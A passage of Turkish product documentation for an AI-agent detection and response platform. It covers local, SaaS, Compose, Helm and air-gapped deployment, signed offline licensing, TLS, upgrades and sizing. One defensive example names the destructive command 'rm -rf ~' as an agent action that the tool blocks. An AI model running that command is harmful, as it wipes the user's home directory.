`/readyz`, imzalama, yedekler, telemetri kuyruğu ve TLS gerçekten sağlıklı olana kadar
başarısız kalır.

**Nasıl çalışır.** `/readyz` varsayılan olarak yedi şeyi kontrol eder: `database`,
`storage`, `functions`, `signing`, `backup`, `queue` ve `certificate`. Üretim başlangıcı
bunların alt kümesini kabul etmez. İmzalama, yedek ve kuyruk sağlığı, üreticilerin
`/run/aidr-health` altına atomik olarak yazdığı kanıt dosyalarından gelir. Metrikler URL,
tenant kimliği, anahtar kimliği veya sır içermez. Alarmlar arasında
`AIDRControlPlaneNotReady`, `AIDRDatabaseUnavailable`, `AIDRSigningKeyExpiresSoon`,
`AIDRBackupUnhealthy`, `AIDRQueueGrowing`, `AIDRCertificateExpiresSoon` ve
`AIDRDashboardErrorBudgetBurn` bulunur.

**Nasıl kullanılır.** `/metrics` uç noktasını üretilen `AIDR_METRICS_TOKEN` ile toplayın,
`deploy/monitoring/prometheus-alerts.yml` dosyasını yükleyin ve alarmları nöbetçi ekibinize
yönlendirin. Her değişiklikten sonra
`node scripts/deployment-doctor.mjs --deployment /srv/aidr --online` çalıştırın.

**Örnek.** Uzak yedek eşik süresinden uzun süredir tamamlanmamıştır. `/readyz` `503`
döndürür ve `AIDRBackupUnhealthy` alarmı tetiklenir.

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| Self-hosted planlar | On-prem Compose, Helm (kanıt çalışanı ayrıca çalıştırılmalı; henüz CronJob yok), Air-gapped; Bulut: sağlayıcı işletir | Prometheus uyumlu izleme sistemi |

**Sınırlamalar.** Kanıt dosyaları işletimsel beyanlardır; onları yazabilen herkes hazırlık
durumunu taklit edebilir, bu yüzden korunmalıdır. Doctor ana makineyi inceleyemediğinde
`UNVERIFIED` raporlar; bu hiçbir zaman başarılı sayılmaz.

---

## 12. Dağıtım seçenekleri

### Yerel mod (kontrol düzlemi olmadan)

**Ne yapar.** Bağlayıcılar ve Browser Guard yalnızca yerel ayarlarla çalışır. Tespit için
hesap, kayıt veya ağ gerekmez.

**Neden önemli.** Koruma kurulumla birlikte başlar; hiç sunucuyla konuşmayan bir dizüstü
bilgisayarda bile çalışır ve kontrol düzlemi ya da lisans ortadan kalksa da devam eder.

**Nasıl çalışır.** `mode` varsayılan olarak `"local"` değerindedir. Kurallar, izin
listeleri, denetim günlüğü ve operatör onayları (`aidr pending`, `aidr approve`) uç
noktada `~/.singularity-aidr/` altında bulunur.

**Nasıl kullanılır.** Bir bağlayıcı kurun ve `aidr setup` çalıştırın. Ayrıntılar için
[configuration.md](../../../configuration.md) dosyasına bakın.

**Örnek.** Kurumsal ağa bağlı olmayan bir yüklenici dizüstü bilgisayarı, bir ajanın
çalıştırdığı `rm -rf ~` komutunu yine engeller ve kararı yerel denetim günlüğüne yazar.

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| Her plan ve plansız kullanım | Yerel | Bağlayıcıya göre Windows, macOS, Linux; Browser Guard için Chrome, Edge, Firefox |

**Sınırlamalar.** Merkezi görünüm, politika, kayıt veya telemetri yoktur. Her uç noktanın
ayarları yerelde yönetilir.

### Bulut (SaaS)

**Ne yapar.** Konsolu, veritabanını ve Edge Functions'ı SingularityRD işletir. Tenant'lar,
SSO ve SCIM, cihaz kaydı, kademeli dağıtımlı imzalı politika, imzalı kural ve istihbarat
paketleri, olay alımı, olası olaylar, denetim dışa aktarımı ve SIEM teslimatı sağlanır.

**Neden önemli.** İşletilecek sunucu olmadan en hızlı başlangıcı sunar.

**Nasıl çalışır.** Uç noktalar yine yerelde korur ve yalnızca [7. bölümde](#7-telemetri-ve-telemetrinin-gizliliği)
anlatılan maskelenmiş verileri gönderir. Ticari karar AB, ABD ve APAC bölgelerini kapsar;
bunlar [`deploy/regions.manifest.json`](../../../../deploy/regions.manifest.json) içinde
beyan olarak kayıtlıdır. Bir bölge, barındırılan projesi, veri yerleşimi koşulları ve alt
işlemci listesi onaylandığında (COM-011) kullanılabilir olur.

**Nasıl kullanılır.** Kayıt açıksa kaydolun, denemeyi başlatın, uç noktaları kaydedin,
bağlayıcıları ve Browser Guard'ı dağıtın, ardından politika yayımlayın. Ayrıntılar için
[saas.md](../../../deployment/saas.md) dosyasına bakın.

**Örnek.** 10 geliştiricili bir ekip denemeyi başlatır, bir ajan kaydeder, ardından
faturalama sayfasından 10 koltuklu Team planını talep eder.

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| Free, Team, Business | Bulut | Web konsolu; platforma göre bağlayıcılar |

**Sınırlamalar.** Barındırılan hizmet henüz müşteri kullanımı için kabul edilmemiştir.
Sözleşme görüşmeleri için aylık %99,9 erişilebilirlik hedefi seçilmiştir; bu bir SLA
değildir.

### Docker Compose ile on-prem

**Ne yapar.** Kontrol düzleminin tamamını kendi Linux ana makinenizde çalıştırırsınız.
`scripts/deployment-prepare.mjs --mode self-hosted`, sabitlenmiş Supabase self-hosted
temel yapılandırmasından (`v0.8.1`) ve AIDR konsolundan yığını (stack) üretir. Migration,
bootstrap, doctor, yedek, geri yükleme tatbikatı, yükseltme, bakım, TLS ve offboarding için
yaşam döngüsü araçları da gelir.

**Neden önemli.** Telemetri, kimlikler ve politika sizin ağınızda, sizin saklama
kurallarınız ve değişiklik yönetiminiz altında kalır.

**Nasıl çalışır.** Hazırlık adımı özel (`0700`) bir dizine şunları yazar: `compose.yml`
(yeniden başlatma politikası, günlük döndürme, sağlık kontrolleri ve kaynak sınırları için
`compose.onprem.overlay.yml` ile birleştirilmiş), `.env`, `.env.functions`,
`.env.readiness` ve `.env.ingress` (hepsi `0600`), migration'lar, fonksiyonlar,
`agent-config.json` ve `deployment.json`. Portlar loopback'e bağlanır; önlerinde sizin TLS
proxy'niz durur. Üç **kaynak profili** servis başına CPU, bellek ve PID sınırlarını belirler
(bkz. [boyutlandırma](#kaynak-boyutlandırma)). İsteğe bağlı **derin tarama yan konteyneri**
(`--with-posture-scanner`), `posture-scanner` Compose profili altında derin tarama
sunucusunu, ajanını ve köprüsünü ekler. Köprü yalnızca `127.0.0.1:8099` adresinde
yayımlanır. Uzak taramalar yalnızca varsayılan olarak her şeyi reddeden, sürümü
sabitlenmiş bir **Squid çıkış geçidi** üzerinden dışarı çıkar. İzin verilen alan adlarını
`/srv/aidr/posture-scanner/egress/allowlist.txt` dosyasına eklersiniz. Loopback, özel, CGNAT ve ayrılmış
adreslere çözümlenen hedefler listede olsalar bile reddedilir.

**Nasıl kullanılır.**
```sh
node scripts/deployment-prepare.mjs --mode self-hosted --output /srv/aidr --profile small \
  --region self-hosted --tenant-region self-hosted \
  --dashboard-url https://aidr.customer.example --supabase-url https://api.aidr.customer.example \
  --artifact-verification-public-key-file /secure-delivery/aidr-artifact-signing-public.pem \
  --telemetry-queue-root /var/lib/aidr-telemetry
docker compose --project-directory /srv/aidr -f /srv/aidr/compose.yml up -d --build
node scripts/deployment-migrate.mjs /srv/aidr
node scripts/deployment-doctor.mjs --deployment /srv/aidr --online
```
Tarama yan konteyneri için `--with-posture-scanner --posture-scanner-signing-public-key-file <pem>
--posture-scanner-signing-key-id <kimlik>` ekleyin. Tüm ayarlar [on-prem yapılandırma başvurusunda](../../../operations/onprem-config-reference.md)
listelenir (`pnpm onprem:config-reference`).

**Örnek.** Bir konteyner 137 çıkış koduyla sürekli yeniden başlar. Bellek sınırına
takılmıştır; operatör bir sonraki bakım penceresinde `--profile medium` profiline geçer.

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| Business, Enterprise | On-prem, Air-gapped | systemd'li 64 bit Linux (x86_64 veya arm64), Compose eklentili Docker Engine, Node 24 |

**Sınırlamalar.** Tek ana makinedir: çoklu ana makine yüksek erişilebilirliği veya
erişilebilirlik SLA'sı yoktur. TLS, device-start imzalayıcısı, kanıt ve yedek
zamanlayıcıları ile ilk hesap oluşturulana kadar doctor başarısız olur. Depodaki derin tarama veri
manifesti imzasızdır; sürümle imzalanmış bir manifest kurulana kadar köprü "hazır değil"
raporlar.

### Helm ile Kubernetes

**Ne yapar.** `deploy/helm/aidr` chart'ı aynı kontrol düzlemini Kubernetes 1.25+ üzerine
kurar. Konsol, Envoy API geçidi, auth, REST, storage, functions, isteğe bağlı küme içi
Postgres, bir migration hook Job'u, isteğe bağlı yedek CronJob'u ve isteğe bağlı derin tarama
yığınını (`postureScanner.enabled`) çalıştırır.

**Neden önemli.** Kubernetes kullanan ekipler chart ile yönetilen yükseltmeler, replikalar,
PodDisruptionBudget'lar ve otomatik ölçeklendirme elde eder; kendi yüksek erişilebilir
Postgres'lerini kullanabilirler.

**Nasıl çalışır.** Chart zayıf kurulumları reddeder: mevcut Secret'lar yoksa, URL'ler
`https` değilse, TLS Secret'ı yoksa, bir imaj etiketi `latest` ise veya derin tarama girdileri
eksikse render başarısız olur. Chart asla sır üretmez. Her pod root olmayan kullanıcıyla,
`seccompProfile: RuntimeDefault`, tüm yetenekler (capabilities) kaldırılmış ve salt okunur
kök dosya sistemiyle çalışır; tek istisna küme içi Postgres'in dosya sistemidir. Varsayılan
olarak her şeyi reddeden bir NetworkPolicy yalnızca yığının ihtiyaç duyduğu akışları açar.
İnternete çıkış amaç bazında ayrıca açılır. Migration'lar önce `post-install`, sonra
`pre-upgrade` hook'u olarak atomik ve sağlama toplamı doğrulamalı çalışır.

**Nasıl kullanılır.**
```bash
node deploy/helm/build-images.mjs --output .aidr-images --registry registry.example.internal --build --push
node deploy/helm/generate-secrets.mjs --output ~/aidr-credentials --namespace aidr \
  --dashboard-url https://aidr.example.com --api-url https://api.aidr.example.com \
  --artifact-verification-public-key-file release-signing.pub.pem
kubectl apply -f ~/aidr-credentials/platform-secret.yaml -f ~/aidr-credentials/functions-secret.yaml
helm install aidr deploy/helm/aidr --namespace aidr -f my-values.yaml
```
`pnpm verify:helm` ile doğrulayın. Önemli değerler: `resourcesPreset` (`small`, `medium`,
`large`), `postgresql.enabled`/`externalDatabase.*`, `storage.backend` (`file` veya `s3`),
`backup.enabled`, `ingress.tlsSecretName` veya `ingress.certManager.*`,
`networkPolicy.*EgressCIDRs`, `global.imageRegistry`.

**Örnek.** `dashboard.image.tag: latest` ile yapılan `helm install`, sürümü sabitlenmemiş
bir imajı dağıtmak yerine render aşamasında başarısız olur.

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| Business, Enterprise | On-prem, Air-gapped (iç imaj deposu ve npm aynası) | NetworkPolicy uygulayan bir CNI, ingress denetleyicisi ve StorageClass bulunan Kubernetes 1.25+ |

**Sınırlamalar.** Henüz canlı bir kümede çalıştırılmamıştır; ilk kurulumu bir hazırlık
provası olarak ele alın. Chart device-start imzalayıcısını kurmaz; imzalayıcı yoksa kayıt
belirteçlerini kullanın. Hazırlık kanıtı çalışanı, SIEM teslimatı ve dışa aktarım saklama
zamanlayıcıları henüz CronJob olarak gelmez. Küme içi Postgres yedeksiz (failover'sız)
tek bir örnektir.

### Air-gapped kurulum

**Ne yapar.** Air-gapped kurulum, on-prem kontrol düzlemini ve uç noktaları internet
erişimi olmadan çalıştırır. Konteyner imajları, uç nokta paketleri, tehdit istihbaratı
paketleri ve lisans onaylı medya ile gelir ve çevrimdışı doğrulanır.

**Neden önemli.** Savunma, finans ve kamu ağları çoğu zaman dışarıya her türlü bağlantıyı
yasaklar; yine de AI ajanları için denetime ihtiyaç duyar.

**Nasıl çalışır.**
- **İmajlar:** `scripts/build-airgap-images.mjs`, yerel derlemelerin Dockerfile `FROM` temel
  imajları dahil hazırlanan yığının tüm imajlarını SHA-256 manifestli tar arşivlerine
  kaydeder. `--verify` paketi Docker veya ağ olmadan çevrimdışı yeniden kontrol eder.
- **Uç nokta paketleri:** Bağlayıcı ve CLI bağımlılıkları müşteri kitine dahil edilir.
  Linux bağlayıcısının imzalı bir çevrimdışı filo paketi vardır
  (`deploy/fleet/linux/build-offline-bundle.sh`).
- **İmzalı istihbarat paketleri:** `scripts/import-offline-pack.mjs`, Ed25519 manifest
  imzasını, dosya özetlerini ve son kullanma tarihini doğrular. Daha eski bir sürüme geri
  dönüşü (rollback) ve çelişkili sürümü (kurulu bir sürüm numarası altında farklı bir
  paket) reddeder. Ardından paketi uç noktalar için (`--target local`) veya özel
  `aidr-packs` kovasına (`--target storage`) kurar.
- **Lisans:** [Çevrimdışı imzalı lisans](#çevrimdışı-imzalı-lisans) yerelde doğrulanır;
  etkinleştirme sunucusu yoktur.

**Nasıl kullanılır.**
```sh
# bağlı hazırlık ana makinesi
node scripts/build-airgap-images.mjs --compose .aidr-deploy/compose.yml --output .aidr-airgap --platform linux/amd64
# bağlantısız ana makine
node scripts/build-airgap-images.mjs --verify --compose .aidr-deploy/compose.yml --output .aidr-airgap
docker load -i .aidr-airgap/tarballs/<ad>.tar
node scripts/import-offline-pack.mjs --pack /media/aidr/aidr-intel-2026.09 \
  --trusted-keys /etc/aidr/intel-trusted-keys.json --target local
```
Helm için imajları iç imaj deposuna gönderin, ardından `global.imageRegistry` ve
`functions.npmRegistry` değerlerini ayarlayın.

**Örnek.** Tar arşivlerinden biri eksik gelir. `--verify`, hiçbir şey yüklenmeden boyut ve
SHA-256 uyuşmazlığıyla başarısız olur.

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| Enterprise (`air_gapped_deployment`) | Air-gapped | Compose veya Helm ile aynı; özetlerin `docker load` sonrasında korunması için containerd imaj deposu önerilir |

**Sınırlamalar.** Teslimat bütünlüğü yayıncı kimliği değildir; noterleme, MDM dağıtımı ve
imaj deposunda yayımlama harici adımlar olarak kalır. İnternet gerektiren özellikler (davet
e-postası, bulut IdP'leri, kartla ödeme) iç ağdan erişilemiyorsa kullanılamaz.

### Çevrimdışı imzalı lisans

**Ne yapar.** Self-hosted ve air-gapped kurulumlar, üretici tarafından imzalanmış bir lisans
dosyasıyla (`aidr-license-v1`) kabul edilir. Dosya koltuk sayısını, geçerlilik aralığını,
ek süre gününü (grace), planı, dağıtım türünü (`onprem` veya `airgap`) ve özellikleri bir
Ed25519 imzası altında taşır.

**Neden önemli.** Sözleşme koşulları artık elle girilemez; bağlantısız bir tesis de
dışarıyla iletişim kurmadan yetkisini kanıtlayabilir.

**Nasıl çalışır.** İmza `aidr-license-v1\n` ile kanonik JSON yükünü kapsar; herhangi bir
koşulu değiştirmek imzayı bozar. Bilinmeyen alanlar reddedilir. Güven yalnızca
`deploy/onprem/license-public-keys.json` dosyasından gelir. Dağıtılan dosyada **hiç anahtar
yoktur**; bu yüzden sürümünüz için üreticinin yayımladığı anahtar kaydı kurulana kadar her
lisans reddedilir. Anahtarlar `active`, `retired` (kendi zaman aralığında verilmiş
lisansları doğrulamaya devam eder) veya `revoked` olabilir.

| Durum | Ne zaman | Yönetilen özellikler | Yerel tespit |
| --- | --- | --- | --- |
| `not_yet_valid` | `not_before` öncesi | kabul edilmez | uygulanır |
| `valid` | `not_before` ≤ şimdi < `expires_at` | etkin | uygulanır |
| `grace` | bitişten sonra `grace_days` (0-90) boyunca | etkin, uyarılarla | uygulanır |
| `expired` | ek süreden sonra | kısıtlı: kapasite 0, kayıt ve olay alımı reddedilir | **uygulanır** |

**Nasıl kullanılır.** Üretici lisansı yalıtılmış bir imzalama ortamında
`scripts/license-issue.mjs` ile üretir. Özel anahtar `0600` izinli bir dosyadan veya
`AIDR_LICENSE_SIGNING_KEY_FILE` değişkeninden okunur; asla komut satırından alınmaz. Siz
lisansı doğrular ve bootstrap'ta kullanırsınız:
```sh
node scripts/license-verify.mjs --license-file /secure-delivery/aidr-license.json
printf '%s' "$AIDR_PASSWORD" | node scripts/deployment-bootstrap.mjs \
  --deployment /srv/aidr --email owner@customer.example \
  --license-file /secure-delivery/aidr-license.json
```
`license-verify` çıkış kodları: `0` geçerli, `2` ek süre, `3` süresi dolmuş, `4` henüz
geçerli değil, `1` reddedildi. Yenilemeleri bir kabul operatörü
`grant_licensed_tenant_admission` ile uygular (bkz. [operator-admin](#operatör-yönetimi-operator-admin)).

**Örnek.** 250 koltuklu bir lisans 1 Ekim 2027'de, 14 günlük ek süreyle sona erer. 10
Ekim'de `license-verify` `2` (ek süre) ile çıkar. 16 Ekim'de konsol yeni uç nokta
telemetrisi almayı bırakır; buna karşın her uç nokta tehlikeli komutları engellemeye
devam eder.

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| Business (on-prem), Enterprise | On-prem, Air-gapped | Dağıtım ana makinesinde Node |

**Sınırlamalar.** Lisans ticari bir denetimdir, DRM değildir: root yetkili bir yönetici
anahtar kaydını veya veritabanı satırlarını değiştirebilir. İmza ve makbuzlar neyin
verildiğini ve uygulandığını gösterir. Süresinden önce iptal bir operatör işlemidir. Elle
girilen pilot koşulları yalnızca süreli pilotlar için `--unsigned-license-for-pilot`
bayrağıyla hâlâ kullanılabilir.

### TLS seçenekleri

**Ne yapar.** TLS üç yoldan yönetilebilir: yenileme zamanlayıcılı genel ACME sertifikaları,
statik modda müşterinin sağladığı sertifikalar (on-prem ve air-gapped için olağan seçim)
veya Kubernetes TLS Secret'ları ve cert-manager.

**Neden önemli.** Ajanlar, tarayıcılar ve IdP'ler kontrol düzlemiyle HTTPS üzerinden
konuşur. Süresi dolmuş bir sertifika kaydı ve telemetriyi durdurur.

**Nasıl çalışır.**
- *ACME:* `deploy/ingress/aidr-tls-renew.timer`, `scripts/deployment-tls-renew.mjs`
  betiğini Certbot ile (webroot) çalıştırır. Nginx'i yalnızca zincir, ana makine adı ve
  geçerlilik kontrolleri geçtikten ve `nginx -t` başarılı olduktan sonra yeniden yükler; her
  deneme için bir makbuz yazar.
- *Statik (müşteri CA'sı):* `deploy/ingress/nginx.onprem.reference.conf` ayrı konsol ve API
  sanal sunucuları, HSTS ve güvenlik başlıkları, yalnızca TLS 1.2 ve 1.3 içerir; `/metrics`
  dışarıya açık değildir ve bilinmeyen ana makine adları reddedilir. `--mode static`
  zinciri, ana makine adını, kalan geçerlilik süresini (`--min-days`) ve anahtar
  eşleşmesini doğrular, atomik olarak kurar ve yeniden yükleme başarısız olursa önceki
  çifti geri getirir.
- *Helm:* `ingress.tlsSecretName` zorunludur; ya da cert-manager doldurur.

**Nasıl kullanılır.**
```sh
sudo node /srv/aidr/ingress/deployment-tls-renew.mjs --mode static \
  --hostname api.aidr.customer.example \
  --cert-file /secure-delivery/api-fullchain.pem --key-file /secure-delivery/api-key.pem
```

**Örnek.** Operatör yanlış ana makine adına ait bir sertifika verir. Araç `refused`
makbuzu yazar ve nginx'e dokunmaz.

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| Self-hosted planlar | ACME: internetten erişilebilen on-prem. Statik: On-prem, Air-gapped. Secret veya cert-manager: Helm. Bulut: sağlayıcı yönetir | Linux üzerinde nginx 1.19.4+ |

**Sınırlamalar.** Statik mod hiçbir şeyi yenilemez; değişimi sertifika süresi dolmadan
planlayın. `AIDRCertificateExpiresSoon` alarmı bunun için yardımcı olur.

### Yükseltme ve geri alma

**Ne yapar.** Compose için `scripts/deployment-upgrade.mjs`, yükseltmeyi `preflight`,
`apply`, `resume` ve `recover` komutlarıyla yürütür ve **sinyallere karşı güvenlidir**
(signal-safe). Helm'de `helm upgrade`, migration'ları `pre-upgrade` hook'u olarak çalıştırır.

**Neden önemli.** Şemayı yarım uygulanmış bırakan, kesintiye uğramış bir yükseltme, bir
kontrol düzleminin yaşayabileceği en kötü kesintidir.

**Nasıl çalışır.** Preflight her artefaktı ve özeti, yalnızca eklenebilen migration
geçmişini, yapılandırmayı ve taze bir şifreli yedeği (varsayılan olarak en fazla 24 saatlik)
doğrular. Ayrıca migration'ları geri alınan bir işlem içinde dener. Apply yazıcıları
durdurur, danışma kilidi (advisory lock) altında atomik olarak migrate eder, özete bağlı
dosyaları kurar, `.env` dosyalarını ve adresleri korur ve çevrimiçi doctor'ın geçmesini
şart koşar. `SIGINT` veya `SIGTERM` alındığında bir sonraki güvenli noktada durur; yazma
yapan adımlar tamamlanır. Şema kaydından önce, bakımdan önce çalışan servisleri yeniden
başlatır; kayıttan sonra onları trafiğe kapalı tutar. Devam edilebilecek aşamayı kaydeder
ve `130` veya `143` ile çıkar. Başarısız her apply bir geri alma planı yazar.

**Nasıl kullanılır.**
```sh
node scripts/deployment-upgrade.mjs preflight --current /srv/aidr --target /srv/aidr-target \
  --backup /backups/aidr-pre-upgrade --key-file /secure/aidr-recovery.key \
  --contract /secure/aidr-upgrade/upgrade-compatibility.json --recovery-output /srv/aidr-recovery
node scripts/deployment-upgrade.mjs apply ... --maintenance     # aynı seçenekler
node scripts/deployment-upgrade.mjs resume ... --maintenance    # kesintiden sonra
```
Hazırlık adımını asla `/srv/aidr` üzerinde yeniden çalıştırmayın; yeni sürümü yeni bir
dizinde hazırlayın.

**Örnek.** Değişiklik penceresi erken biter ve operatör dosya kurulumu sırasında bir kez
`SIGTERM` gönderir. Araç o adımı bitirir, `interrupted_by` kaydeder ve `143` ile çıkar.
Sonraki `resume` migration'ları yeniden uygulamadan kaldığı yerden devam eder.

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| Self-hosted planlar | On-prem Compose, Air-gapped; Helm için `helm upgrade` | Linux ana makine (Compose); Helm 3 (Kubernetes) |

**Sınırlamalar.** Migration'lar yalnızca ileriye doğrudur. Şema kaydedildikten sonra geri
alma, geriye doğru migration değil, yedeği yeni ve yalıtılmış bir projeye geri yüklemektir
(`recover`). Helm'de `helm rollback` manifestleri geri getirir, şemayı getirmez.

### Kaynak boyutlandırma

Aşağıdaki değerler `deploy/onprem/resource-profile.json`,
`deploy/RESOURCE_REQUIREMENTS.md` ve Helm değerlerinden alınan başlangıç bütçeleridir.
Kapasite taahhüdü değildir; kendi yük ve dayanıklılık (soak) testlerinizle doğrulayın.

| Nerede | Profil | Başlangıç noktası | Derin tarama yan konteyneri için ek |
| --- | --- | --- | --- |
| Compose ana makinesi | `small` (varsayılan): pilot, yaklaşık 100 uç noktaya kadar | 4 vCPU, 8 GiB RAM, 100 GiB SSD | +4 vCPU, 6 GiB, 40 GiB |
| Compose ana makinesi | `medium`: yaklaşık 1.000 uç nokta için yük testi başlangıcı | 8 vCPU, 16 GiB RAM, 250 GiB SSD | +6 vCPU, 8 GiB, 60 GiB |
| Compose ana makinesi | `large`: binlerce uç noktalı testler için ayrılmış ana makine | 16 vCPU, 32 GiB RAM, 500 GiB SSD | +8 vCPU, 12 GiB, 100 GiB |
| Kubernetes | `resourcesPreset: small` (değerlendirme, 250 koltuk altı), `medium` (x2, 2.500 koltuk altı), `large` (x4) | Bileşen başına istek ve sınırlar | `postureScanner.*` bileşenleri |
| Uç nokta | korunan cihaz başına | 512 MiB disk ayırın (paketler, varsayılan 64 MiB olay kuyruğu, besleme, günlükler) | - |

2 KiB'lık olaylar, 90 günlük saklama ve günlük ortalamanın 10 katı zirve varsayımıyla
telemetri planlama modeli. Bu varsayımları gerçek müşteri verisiyle değiştirin:

| Cihaz | Günlük politika + ingest çağrısı | Günlük veri | 90 günlük olay depolaması | Planlama zirvesi |
| ---: | ---: | ---: | ---: | ---: |
| 10 | 700 | 2,5 MiB | 0,05 GiB | 1 RPS |
| 100 | 14.000 | 50,8 MiB | 1,03 GiB | 2 RPS |
| 1.000 | 400.000 | 1,45 GiB | 20,6 GiB | 47 RPS |

---

## 13. Dağıtım x özellik matrisi

| Özellik | Yerel mod | Bulut (SaaS) | On-prem Compose | Kubernetes (Helm) | Air-gapped |
| --- | --- | --- | --- | --- | --- |
| Yerel tespit ve uygulama | Evet | Evet | Evet | Evet | Evet |
| Yönetim konsolu (web) | - | Evet | Evet | Evet | Evet |
| Deneme kaydı | - | Evet | - | - | - |
| Cihaz koduyla kayıt | - | Evet | Evet (imzalayıcıyla) | İmzalayıcı chart'ta yok; kayıt belirteci kullanın veya ekleyin | Evet (imzalayıcıyla) |
| API anahtarları ve kayıt belirteçleri | - | Evet | Evet | Evet | Evet |
| Çalışma zamanı politikası, kademeli dağıtım, DLP düzenleyicisi | Yalnızca yerel politika dosyası | Evet | Evet | Evet | Evet |
| Browser Privacy raporlaması | Eklenti yerelde maskeler, rapor yok | Evet | Evet | Evet | Evet |
| Yapay Zekâ Güvenlik Duruşu sayfası | Tarayıcılar yerelde çalışır, sayfa yok | Evet | Evet | Evet | Evet (iç hedefler) |
| Derin tarama yan konteyneri | İsteğe bağlı loopback köprü | Barındırılan hizmette listelenmemiş | İsteğe bağlı `--with-posture-scanner` | İsteğe bağlı `postureScanner.enabled` | İsteğe bağlı; uzak taramalar yalnızca çıkış izin listesiyle |
| Entra ID SSO | - | Evet | Evet | Evet | Yalnızca IdP iç ağdan erişilebilirse |
| SAML 2.0 | - | Evet | Evet (Auth SAML için yapılandırılmış) | Evet (`dashboard.saml.*`) | İç IdP ile |
| SCIM | - | Evet | Evet | Evet | Evet (IdP API'ye ulaşabilmeli) |
| MFA, kurtarma kodları, oturum iptali | - | Evet | Evet | Evet | Evet |
| Davet e-postası | - | E-posta sağlayıcısı yapılandırılmışsa | Sağlayıcıya çıkış gerekir; yoksa manuel bağlantı | Compose ile aynı | Manuel bağlantı |
| Denetim dışa aktarımı (CSV/JSON) | Yerel JSONL denetim günlüğü | Evet | Evet | Evet | Evet |
| SIEM teslimatı | - | Barındırılan hizmette listelenmiş | Evet (systemd zamanlayıcı) | Henüz CronJob yok | Evet (iç SIEM) |
| Alarm entegrasyonları (Slack, Teams, webhook, e-posta) | - | Evet (pg_cron dağıtıcı) | Evet (systemd zamanlayıcı) | Evet (CronJob, isteğe bağlı) | Yalnızca iç webhook veya posta aktarıcısı |
| Kartla ödeme (Stripe) | - | Yalnızca self-service açıksa | - | - | - |
| Fatura ve operatör lisansı | - | Evet | Evet | Evet | Evet |
| İmzalı çevrimdışı lisans | - | - | Evet | Evet | Evet |
| Çevrimdışı imzalı istihbarat paketleri | Uç nokta içe aktarımı (`--target local`) | İmzalı besleme ve paket indirme | Evet (`--target storage`) | Uç nokta içe aktarımı; depolama içe aktarımı Compose dizini bekler | Evet |
| Şifreli uzak yedek ve geri yükleme tatbikatı | - | Sağlayıcı işletir | Evet | `pg_dump` CronJob; sağlayıcı PITR | Evet (çevrimdışı hedef) |
| `/readyz`, `/metrics`, Prometheus alarmları | - | Sağlayıcı işletir | Evet | Evet (kanıt çalışanını çalıştırın) | Evet |
| Sinyallere karşı güvenli yükseltme aracı | - | Sağlayıcı işletir | Evet | pre-upgrade migration'lı `helm upgrade` | Evet |
| TLS | - | Sağlayıcı yönetir | ACME zamanlayıcı veya statik müşteri sertifikası | TLS Secret veya cert-manager | Statik müşteri sertifikası |
| Operatör yönetim CLI'ı | - | SingularityRD operatörleri | Müşteri operatörleri | Müşteri operatörleri | Müşteri operatörleri |

---

## 14. Bağlantılı belgeler

- [Kontrol düzlemi](../../../control-plane.md), [faturalama](../../../billing.md), [fiyatlandırma](../../../pricing.md)
- [Bulut dağıtımı](../../../deployment/saas.md), [on-prem dağıtımı](../../../deployment/onprem.md)
- [On-prem kurulum](../../../../deploy/onprem/README.md), [kurulum ve doğrulama](../../../../deploy/README.md), [ilk müşteri rehberi](../../../../deploy/FIRST_CUSTOMER.md)
- [Kubernetes işletimi](../../../operations/kubernetes.md), [Helm chart](../../../../deploy/helm/aidr/README.md)
- [Lisanslama](../../../operations/licensing.md), [operatör yönetimi](../../../operations/operator-admin.md), [kabul operatörleri](../../../operations/admission-operators.md)
- [Yükseltme runbook'u](../../../../deploy/UPGRADE.md), [yedekleme runbook'u](../../../../deploy/backup/README.md), [izleme](../../../../deploy/monitoring/README.md), [zamanlanmış bakım](../../../../deploy/maintenance/README.md), [giriş ve TLS](../../../../deploy/ingress/README.md)
- [Yapay Zekâ Güvenlik Duruşu](../../../ai-security-posture.md), [tehdit istihbaratı senkronizasyonu ve air-gapped güncellemeler](../../../operations/threat-sync.md)
- [Gizlilik ve telemetri veri akışı](../../../privacy.md), [gizlilik telemetrisi sözleşmesi](../../../contracts/privacy-telemetry.md), [alarm bildirimi sözleşmesi](../../../contracts/notifications.md), [cihaz yetkilendirmesi](../../../device-auth.md)
- [Müdahale playbook'ları](../../../operations/response-playbooks.md), [kurtarma kodları](../../../security/recovery-codes.md)
- [Ürün genel bakışı](../../overview.md)
